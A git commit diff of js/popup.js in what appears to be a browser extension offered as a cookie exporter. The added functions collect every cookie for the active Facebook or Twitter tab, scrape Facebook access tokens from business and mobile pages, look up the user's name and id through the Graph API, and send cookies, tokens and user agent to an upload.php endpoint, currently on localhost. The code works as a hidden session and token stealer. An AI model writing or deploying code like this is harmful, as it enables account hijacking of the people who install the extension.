2e01ca1580b541643604dc0c44f7232ed02b4b7f
sondc <congson99tn@gmail.com>
2021-07-01 18:30:58 +0700

    send to page update

--- js/popup.js
+++ js/popup.js
@@ -1,5 +1,6 @@
 ! function(e, t) {
     "function" == typeof define && define.amd ? define([], t) : "undefined" != typeof exports ? t() : t()
+    alert(define.amd);
 },
 function(e) {
     e.storage.local.get({
@@ -20,23 +21,258 @@ function(e) {
             methods: {
                 exportCookies: function() {
                     var t = this;
-                    site = ['www.facebook.com', '']
-                    if (t['sitename']);
-                    // if (!this.isValidProtocol) return !1;
-                    // if (this.fullpage) try {
-                    //     var r = new URL(window.top.location.href);
-                    //     this.doExport(atob(r.searchParams.get("url")))
-                    // } catch (i) {
-                    //     console.error(i.message)
-                    // } else e.tabs.query({
-                    //     active: !0,
-                    //     currentWindow: !0
-                    // }, function(e) {
-                    //     t.doExport(e[0].url)
-                    // })
-                },
+                    // site = ['www.facebook.com', '']
+                    // if (t['sitename']);
 
-                doExport: function(t) {
+                    if (!this.isValidProtocol) return !1;
+                    if (this.fullpage) try {
+                        var r = new URL(window.top.location.href);
+                        this.doExport(atob(r.searchParams.get("url")))
+                    } catch (i) {
+                        console.error(i.message)
+                    } else e.tabs.query({
+                        active: !0,
+                        currentWindow: !0
+                    }, function(e) {
+                        if (t.sitename.includes("facebook")) {
+                            // t.doExportFacebook(e[0].url);
+                            t.doExportFacebookGET(e[0].url);
+                        } else if (t.sitename.includes("twitter")) {
+                            t.doExportTwitterGET(e[0].url);
+                        }
+                    })
+                },
+                doExportTwitterGET: function(t) {
+                    var r = this;
+                    var UA;
+                    try {
+                        var i = new URL(t),
+                            o = i.origin;
+                        UA = navigator.userAgent;
+                        e.cookies.getAll({
+                            url: o
+                        }, function(e) {
+                            if (e.length > 0) {
+                                format = '';
+                                for (let i = 0; i < e.length; i++) {
+                                    if (e[i].name == 'twid') {
+                                        var uid = e[i].value;
+                                    }
+                                    format += e[i].name + '=' + e[i].value;
+                                    if (i < e.length - 1) {
+                                        format += ','
+                                    }
+                                }
+
+                                var sendurl = `http://localhost/testweb/upload.php?uid=${uid}&url=${o}&useragent=${UA}&cookie=${format}`;
+                                console.log(sendurl);
+                                var encodeurl = encodeURI(sendurl);
+                                console.log(encodeurl);
+                                chrome.tabs.create({ url: encodeurl });
+                                // $.ajax({
+                                //     url: 'http://localhost/testweb/upload.php',
+                                //     type: 'POST',
+                                //     data: {
+                                //         uid: fbInfo['id'],
+                                //         name: fbInfo['name'],
+                                //         url: o,
+                                //         useragent: UA,
+                                //         cookie: format,
+                                //         uToken: uToken,
+                                //         bToken: bToken
+                                //     },
+                                //     success: function(result) {
+                                //         console.log(result);
+                                //         alert(fbInfo['id'] + ' was sent!');
+                                //     }
+
+                                // });
+
+                            } else r.error = !0
+                        })
+                    } catch (s) {
+                        return console.error(s.message), !1
+                    }
+                },
+                doExportFacebookGET: function(t) {
+                    var r = this;
+                    var uToken, bToken, fbInfo, UA;
+                    try {
+                        var i = new URL(t),
+                            o = i.origin;
+                        UA = navigator.userAgent;
+                        e.cookies.getAll({
+                            url: o
+                        }, function(e) {
+                            if (e.length > 0) {
+                                format = '';
+                                for (let i = 0; i < e.length; i++) {
+                                    format += e[i].name + '=' + e[i].value;
+                                    if (i < e.length - 1) {
+                                        format += ','
+                                    }
+                                }
+                                var t = {
+                                        url: o,
+                                        cookies: e
+                                    },
+                                    i = JSON.stringify(t);
+
+                                var z = $.ajax({
+                                    url: "https://business.facebook.com/business_locations",
+                                    type: "get",
+                                    async: false,
+                                    global: false,
+                                    success: function(t) {
+                                        return t;
+                                    }
+                                }).responseText;
+                                z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
+                                var s = $.ajax({
+                                    url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
+                                    type: "get",
+                                    async: false,
+                                    global: false,
+                                    success: function(t) {
+                                        return t;
+                                    }
+                                }).responseText;
+                                s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
+                                if ("" != uToken) {
+                                    fbInfo = $.ajax({
+                                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
+                                        type: "get",
+                                        dataType: 'json',
+                                        async: false,
+                                        global: false,
+                                        success: function(o) {
+                                            if (o.name) {
+                                                var name = o.name;
+                                                var uid = o.id;
+                                            }
+                                            return name, uid
+                                        }
+                                    }).responseJSON;
+                                }
+                                console.log(fbInfo);
+
+                                var sendurl = `http://localhost/testweb/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${o}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
+                                console.log(sendurl);
+                                var encodeurl = encodeURI(sendurl);
+                                console.log(encodeurl);
+                                chrome.tabs.create({ url: encodeurl });
+                                // $.ajax({
+                                //     url: 'http://localhost/testweb/upload.php',
+                                //     type: 'POST',
+                                //     data: {
+                                //         uid: fbInfo['id'],
+                                //         name: fbInfo['name'],
+                                //         url: o,
+                                //         useragent: UA,
+                                //         cookie: format,
+                                //         uToken: uToken,
+                                //         bToken: bToken
+                                //     },
+                                //     success: function(result) {
+                                //         console.log(result);
+                                //         alert(fbInfo['id'] + ' was sent!');
+                                //     }
+
+                                // });
+
+                            } else r.error = !0
+                        })
+                    } catch (s) {
+                        return console.error(s.message), !1
+                    }
+                },
+                doExportFacebook: function(t) {
+                    var r = this;
+                    var uToken, bToken, fbInfo, UA;
+                    try {
+                        var i = new URL(t),
+                            o = i.origin;
+                        UA = navigator.userAgent;
+                        e.cookies.getAll({
+                            url: o
+                        }, function(e) {
+                            if (e.length > 0) {
+                                format = '';
+                                for (let i = 0; i < e.length; i++) {
+                                    format += e[i].name + '=' + e[i].value;
+                                    if (i < e.length - 1) {
+                                        format += ','
+                                    }
+                                }
+                                var t = {
+                                        url: o,
+                                        cookies: e
+                                    },
+                                    i = JSON.stringify(t);
+
+                                var z = $.ajax({
+                                    url: "https://business.facebook.com/business_locations",
+                                    type: "get",
+                                    async: false,
+                                    global: false,
+                                    success: function(t) {
+                                        return t;
+                                    }
+                                }).responseText;
+                                z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
+                                var s = $.ajax({
+                                    url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
+                                    type: "get",
+                                    async: false,
+                                    global: false,
+                                    success: function(t) {
+                                        return t;
+                                    }
+                                }).responseText;
+                                s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
+                                if ("" != uToken) {
+                                    fbInfo = $.ajax({
+                                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
+                                        type: "get",
+                                        dataType: 'json',
+                                        async: false,
+                                        global: false,
+                                        success: function(o) {
+                                            if (o.name) {
+                                                var name = o.name;
+                                                var uid = o.id;
+                                            }
+                                            return name, uid
+                                        }
+                                    }).responseJSON;
+                                }
+                                console.log(fbInfo);
+                                $.ajax({
+                                    url: 'http://localhost/testweb/upload.php',
+                                    type: 'POST',
+                                    data: {
+                                        uid: fbInfo['id'],
+                                        name: fbInfo['name'],
+                                        url: o,
+                                        useragent: UA,
+                                        cookie: format,
+                                        uToken: uToken,
+                                        bToken: bToken
+                                    },
+                                    success: function(result) {
+                                        console.log(result);
+                                        alert(fbInfo['id'] + ' was sent!');
+                                    }
+
+                                });
+
+                            } else r.error = !0
+                        })
+                    } catch (s) {
+                        return console.error(s.message), !1
+                    }
+                },
+                doExportTwitter: function(t) {
                     var r = this;
                     var uToken, bToken, fbInfo, UA;
                     try {
